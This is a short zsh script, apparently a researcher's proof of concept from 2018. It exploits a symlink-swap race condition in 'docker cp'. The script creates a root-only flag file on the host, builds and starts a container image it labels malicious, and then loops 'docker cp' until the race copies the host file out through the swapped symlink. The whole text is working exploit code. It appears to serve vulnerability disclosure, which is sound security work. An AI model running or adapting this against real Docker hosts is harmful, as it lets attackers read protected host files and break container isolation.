#!/bin/zsh
# Copyright (C) 2018 Aleksa Sarai <asarai@suse.de>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

SYMSWAP_PATH=/totally_safe_path
SYMSWAP_TARGET=/w00t_w00t_im_a_flag

# Create our flag.
echo "SUCCESS -- COPIED FROM THE HOST" | sudo tee "$SYMSWAP_TARGET"
sudo chmod 000 "$SYMSWAP_TARGET"

# Run and build the malicious image.
docker build -t cyphar/symlink_swap \
	--build-arg "SYMSWAP_PATH=$SYMSWAP_PATH" \
	--build-arg "SYMSWAP_TARGET=$SYMSWAP_TARGET" build/
ctr_id=$(docker run --rm -d cyphar/symlink_swap "$SYMSWAP_PATH")

# Now continually try to copy the files.
idx=0
while true
do
	mkdir "ex${idx}"
	docker cp "${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET" "ex${idx}/out"
	idx=$(($idx + 1))
done
